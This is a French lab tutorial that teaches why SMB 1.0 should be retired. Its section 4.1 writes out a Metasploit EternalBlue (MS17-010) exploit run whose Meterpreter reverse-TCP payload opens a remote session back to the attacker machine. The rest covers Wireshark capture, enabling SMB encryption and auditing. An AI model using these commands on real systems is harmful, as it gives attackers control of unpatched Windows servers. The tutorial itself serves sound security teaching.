# **Démonstration de failles de sécurité sur SMB 1.0 avec exploitation via Metasploit et comparaison avec SMB 3.1.1**

---

# **1. Objectifs pédagogiques**

Dans cette démonstration, vous allez :

- Comprendre les failles de sécurité associées à SMB 1.0.
- Simuler une attaque en exploitant la vulnérabilité EternalBlue (CVE-2017-0144) avec Metasploit.
- Comparer la sécurité offerte par SMB 3.1.1, qui inclut des mécanismes de chiffrement modernes.
- Utiliser des outils d'analyse réseau comme Wireshark ou Microsoft Message Analyzer pour capturer et analyser le trafic réseau SMB (SMB 1.0 non chiffré vs SMB 3.1.1 chiffré).

---

# **2. Configuration requise**

#### **Machines utilisées**

| Machine        | Rôle                       | Système d'exploitation | IP Statique     | Nom d’hôte      |
| -------------- | -------------------------- | ---------------------- | --------------- | --------------- |
| Windows Server | Contrôleur de domaine, SMB  | Windows Server 2016/2019| 192.168.1.10    | SERVER01        |
| Windows 10     | Client du domaine           | Windows 10 Pro         | 192.168.1.20    | CLIENT01        |
| Kali Linux     | Test d'attaque Metasploit   | Kali Linux             | 192.168.1.30    | KALI            |

---

# **3. Schéma réseau ASCII**

```
                                +-------------------------+
                                |      Routeur            |
                                |    Passerelle: 192.168.1.1|
                                +-------------------------+
                                          |
                                          |
                              +-----------+------------+
                              |          Réseau Local            |
                              |         (192.168.1.0/24)         |
                              +-----------+------------+
                                          |
              +-------------------+       +-------------------+      +-------------------+
              |  Windows Server    |       |  Windows 10       |      |  Kali Linux       |
              |   (AD & SMB)       |       |   (Client)        |      |  (Metasploit)     |
              |   IP: 192.168.1.10 |       |   IP: 192.168.1.20|      |   IP: 192.168.1.30|
              +-------------------+       +-------------------+      +-------------------+
              |  Domaine: cafe.local       |  Domaine: cafe.local     |   Test d'attaque  |
              |  SMB 1.0 & 3.x             |  DNS: 192.168.1.10       |  (Metasploit)     |
              +-------------------+       +-------------------+      +-------------------+
```

---

# **4. Étapes détaillées**

#### **4.1. Activation et simulation d'une attaque SMB 1.0**

1. **Activer SMB 1.0 sur le serveur Windows :**

   ```powershell
   # Activer SMB 1.0 pour la démonstration
   Set-SmbServerConfiguration –EnableSMB1Protocol $true
   ```

2. **Simulation d'une attaque avec Metasploit (exploitation EternalBlue) :**

   Sur **Kali Linux**, lancez Metasploit pour exploiter la vulnérabilité EternalBlue :

   ```bash
   msfconsole
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST 192.168.1.10  # IP du serveur Windows
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.1.30  # IP de Kali Linux
   exploit
   ```

3. **Montrer les résultats aux étudiants :**
   Après exploitation, Metasploit vous donne accès à une session **Meterpreter** sur la machine cible. Montrez comment un attaquant peut prendre le contrôle de la machine cible en raison de l'utilisation de SMB 1.0.

---

#### **4.2. Capture et analyse du trafic SMB 1.0 avec Wireshark**

1. **Lancer Wireshark** sur Kali Linux ou une autre machine pour capturer le trafic réseau entre la machine Windows 10 et le serveur Windows avec SMB 1.0 activé.

2. **Capturer le trafic SMB 1.0** pendant un transfert de fichier entre les deux machines via un partage SMB.

3. **Analyser le trafic capturé** : Montrez que le contenu des fichiers est visible en clair, car SMB 1.0 ne chiffre pas les données.

   **Étapes détaillées pour la capture et analyse :**
   
   - **Lancer Wireshark** : Tapez `wireshark` dans le terminal de Kali pour lancer l'application.
   - **Sélectionner l'interface réseau** : Choisissez l'interface appropriée (généralement `eth0` pour Ethernet) et commencez la capture en cliquant sur le bouton vert **"Start"**.
   - **Effectuer un transfert de fichier** depuis le client Windows 10 vers le serveur Windows avec un dossier partagé SMB 1.0 (`\\192.168.1.10\SharedFolder`).
   - **Filtrer les paquets SMB** : Dans Wireshark, tapez `smb` dans la barre de filtre et appuyez sur Entrée.
   - **Analyser les paquets SMB Write** : Recherchez les paquets contenant les données du fichier transféré. Vous verrez que les données sont envoyées en clair.

---

#### **4.3. Passage à SMB 3.1.1 et démonstration de la sécurité**

1. **Désactiver SMB 1.0 et activer SMB 3.1.1** sur le serveur Windows :

   ```powershell
   # Désactiver SMB 1.0 et activer SMB 3.x avec chiffrement
   Set-SmbServerConfiguration –EnableSMB1Protocol $false
   Set-SmbServerConfiguration –EnableSMB2Protocol $true
   Set-SmbServerConfiguration –EncryptData $true
   ```

2. **Répéter le transfert de fichier** avec SMB 3.1.1 activé et capturer à nouveau le trafic avec Wireshark ou **Microsoft Message Analyzer**.

3. **Analyser le trafic capturé** : Montrez que les données sont maintenant chiffrées et que les informations sensibles ne peuvent plus être interceptées.

---

# **5. Export et analyse des journaux d’audit**

1. **Activer l'audit des accès SMB :**

   ```powershell
   Set-SmbServerConfiguration –AuditSmb1Access $true
   ```

2. **Afficher les événements d’audit générés :**

   ```powershell
   Get-WinEvent -LogName Microsoft-Windows-SMBServer/Audit
   ```

3. **Exporter les événements d’audit vers un fichier CSV :**

   ```powershell
   $events = Get-WinEvent -LogName Microsoft-Windows-SMBServer/Audit
   $events | Export-Csv -Path "C:\AuditSMB.csv" -NoTypeInformation
   ```

---

# **6. Comparaison SMB 1.0 vs SMB 3.1.1**

| Fonctionnalité          | SMB 1.0                     | SMB 3.1.1                   |
| ----------------------- | --------------------------- | --------------------------- |
| Chiffrement              | Aucun                       | AES-128-GCM / AES-128-CCM    |
| Vulnérabilité EternalBlue| Oui                         | Non                         |
| Intégrité des données    | Non                         | Oui (Pré-authentification)   |
| Performance              | Faible                      | Améliorée                    |
| Risques de sécurité      | Élevés                      | Réduits                      |

---

# **7. Conclusion**

Cette démonstration permet de :
- Montrer les risques d'utiliser SMB 1.0, notamment via l'exploitation de la vulnérabilité EternalBlue.
- Mettre en évidence l'importance de désactiver SMB 1.0 dans les environnements modernes.
- Enseigner la migration vers SMB 3.1.1 pour bénéficier du chiffrement et d'autres améliorations en matière de sécurité.
- Utiliser des outils comme **Wireshark** et **Metasploit** pour analyser le comportement des protocoles réseau.

